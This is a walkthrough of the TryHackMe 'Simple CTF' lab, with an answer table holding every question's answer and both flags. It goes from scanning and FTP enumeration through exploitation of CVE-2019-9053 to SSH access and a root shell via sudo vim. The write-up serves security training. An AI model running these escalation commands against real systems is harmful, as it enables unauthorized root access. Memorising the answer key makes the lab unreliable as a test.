# Simple CTF — Full Walkthrough

**Target:** `10.48.185.49`
**Difficulty:** Easy
**Platform:** TryHackMe
**Attacker:** 0xb0rn3

---

## Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | How many services are on port ≤1000? | **2** (FTP/21, HTTP/80) |
| 2 | What's running on the higher port? | **SSH on port 2222** |
| 3 | What's the CVE being used? | **CVE-2019-9053** |
| 4 | What kind of vulnerability? | **SQLi (Time-Based Blind SQL Injection)** |
| 5 | What's the password? | **secret** |
| 6 | Where to login with obtained credentials? | **SSH port 2222** |
| 7 | User flag? | **G00d j0b, keep up!** |
| 8 | Username in /home? | **sunbath** |
| 9 | What to leverage for privileged shell? | **vim (sudo NOPASSWD)** |
| 10 | Root flag? | **W3ll d0n3. You made it!** |

---

## Reconnaissance

### Fast Port Scan

```bash
sudo nmap -p- --min-rate=5000 -T4 -sS 10.48.185.49
```

**Result:** Ports 21/tcp (FTP), 80/tcp (HTTP), 2222/tcp (SSH)

Scanning only the top 1000 ports (nmap default) returns **2 services**: FTP on 21 and HTTP on 80.
The **higher port** with SSH is 2222 — found by scanning the full range.

### Service Version Detection

```bash
sudo nmap -sV -sC -p21,80,2222 10.48.185.49
```

**Results:**
- `21/tcp` — **vsftpd 3.0.3** — Anonymous FTP login **allowed**
- `80/tcp` — **Apache/2.4.18 (Ubuntu)** — `robots.txt` reveals `/openemr-5_0_1_3` (rabbit hole)
- `2222/tcp` — **OpenSSH 7.2p2**

---

## FTP Enumeration

Anonymous login is allowed. Found a note in `/pub/`:

```
Dammit man... you're the worst dev i've seen. You set the same pass for the system user,
and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

**Key intel:** User `mitch` uses a weak password that is identical to his system/SSH password.

---

## Web Enumeration

Directory bruteforce reveals:

```bash
gobuster dir -u http://10.48.185.49 -w /usr/share/dirb/wordlists/common.txt -t 50 -q
```

**Found:** `/simple/` — **CMS Made Simple version 2.2.8**

---

## Exploitation — CVE-2019-9053

**Vulnerability:** Unauthenticated Time-Based Blind SQL Injection in CMS Made Simple ≤ 2.2.9
**Affected endpoint:** `/simple/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=[payload]`
**CVE:** CVE-2019-9053
**ExploitDB:** 46635

The injectable parameter `m1_idlist` is passed unsanitized into a MySQL query inside the News module. An attacker can inject `SLEEP()` payloads to exfiltrate data character-by-character based on timing differences.

**Extracted data:**

| Field | Value |
|-------|-------|
| Username | `mitch` |
| Email | `admin@admin.com` |
| Salt | `1dac0d92e9fa6bb2` |
| Password Hash | `0c01f4468bd75d7a84c7eb73846e8d96` |

**Hash format:** `MD5(salt + password)`

```bash
python3 -c "
import hashlib
salt = '1dac0d92e9fa6bb2'
password = 'secret'
print(hashlib.md5((salt + password).encode()).hexdigest())
# Output: 0c01f4468bd75d7a84c7eb73846e8d96
"
```

**Cracked password:** `secret`

---

## Initial Access — SSH Login

```bash
ssh -p 2222 mitch@10.48.185.49
# Password: secret
```

```
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
```

**User flag:**

```bash
cat ~/user.txt
# G00d j0b, keep up!
```

**Other user in /home:** `sunbath`

---

## Privilege Escalation — vim sudo NOPASSWD

Checking sudo permissions:

```bash
sudo -l
```

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`vim` is listed on [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo) as a sudo escalation vector.
Spawning a root shell:

```bash
sudo vim -c ':!/bin/bash'
```

Or non-interactive root command execution:

```bash
sudo vim -c ':!/bin/bash -c "cat /root/root.txt"'
```

**Root flag:**

```
W3ll d0n3. You made it!
```

---

## Attack Chain Summary

```
[Recon]
  nmap full scan → ports 21, 80, 2222
  Anonymous FTP → note reveals weak/reused password for "mitch"
  Gobuster → /simple/ (CMS Made Simple 2.2.8)

[Exploitation]
  CVE-2019-9053 (SQLi) → mitch:0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
  Crack MD5(salt+pass) → password: secret

[Initial Access]
  SSH port 2222 as mitch:secret
  cat ~/user.txt → G00d j0b, keep up!

[PrivEsc]
  sudo -l → vim NOPASSWD
  sudo vim -c ':!/bin/bash' → root shell
  cat /root/root.txt → W3ll d0n3. You made it!
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service enumeration |
| `gobuster` | Web directory bruteforce |
| Python3 | Custom SQLi extraction script |
| `sshpass` | SSH automation |
| `vim` | Privilege escalation (GTFOBins) |
